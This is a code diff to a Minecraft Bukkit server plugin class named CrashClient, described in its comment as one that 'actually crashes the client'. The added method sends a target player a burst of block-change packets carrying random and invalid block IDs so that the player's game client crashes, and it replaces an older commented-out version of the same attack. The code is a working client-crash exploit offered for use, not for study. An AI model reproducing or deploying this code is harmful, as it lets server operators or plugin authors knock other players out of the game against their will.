@@ -4,22 +4,18 @@ import net.minecraft.server.v1_8_R3.EntityPlayer;
 import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
 import org.bukkit.entity.Player;
 
+import java.util.Random;
+
 /**
  * Actually crashes the client pog
  */
 public class CrashClient {
-    public void crashPlayer(Player p) {
-        EntityPlayer v = ((CraftPlayer) p).getHandle();
-        /*
-        Packet53BlockChange deathPacket = new Packet53BlockChange();
-        deathPacket.a = (int) p.getLocation().getX();
-        deathPacket.b = (int) p.getLocation().getY();
-        deathPacket.c = (int) p.getLocation().getZ();
-        deathPacket.data = 0;
-        deathPacket.material = 900; //invalid block id
-        deathPacket.lowPriority = false;
-
-        v.playerConnection.sendPacket(deathPacket);deathPacket
-         */
+    public void crashPlayer(Player target) {
+        Random random = new Random(System.currentTimeMillis());
+        for (int i = 0; i < 10; i++) {
+            target.sendBlockChange(target.getLocation(), random.nextInt(2674) - 1337, (byte) 0);
+        }
+        target.sendBlockChange(target.getLocation(), -6666, (byte) 0);
+        target.sendBlockChange(target.getLocation(), 6666, (byte) 0);
     }
 }
